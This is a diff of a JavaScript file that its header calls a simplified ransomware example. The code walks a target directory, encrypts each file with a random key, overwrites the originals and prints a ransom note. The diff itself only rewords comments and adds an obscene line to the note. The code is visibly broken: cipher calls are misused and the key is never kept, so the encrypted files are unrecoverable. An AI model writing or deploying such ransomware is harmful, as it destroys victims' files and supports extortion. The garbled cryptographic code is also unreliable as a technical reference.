@@ -14,11 +14,9 @@ This JavaScript code provides a simplified example of a ransomware attack and it
 var fs = require('fs');
 var crypto = require('crypto');
 
-// The first step is to identify the directory to be targeted for file encryption.
 // Directory to target for file encryption
 var targetDirectory = '/user/files';
 
-// Generate encryption key
 // Once the encryption key is generated, the code will read all files in the target directory.
 var encryptionKey = crypto.randomBytes(32).toString('hex');
 
@@ -36,7 +34,7 @@ fs.readdirSync(targetDirectory).forEach(file => {
     .update(data, 'utf8', 'hex') +
     crypto.createCipher.final('hex');
 
-  // Write encrypted data back to file
+  // writing encrypted data back to file
   // Finally, the code will display a ransom note to the user, demanding payment in exchange for the decryption key.
 
   fs.writeFileSync(file, encryptedData);
@@ -45,7 +43,7 @@ fs.readdirSync(targetDirectory).forEach(file => {
 // Display ransom note to user
 var ransomNote = `
 Your files have been encrypted!
-e.g
+e.g go fuck off
 `;
 
 console.log(ransomNote);
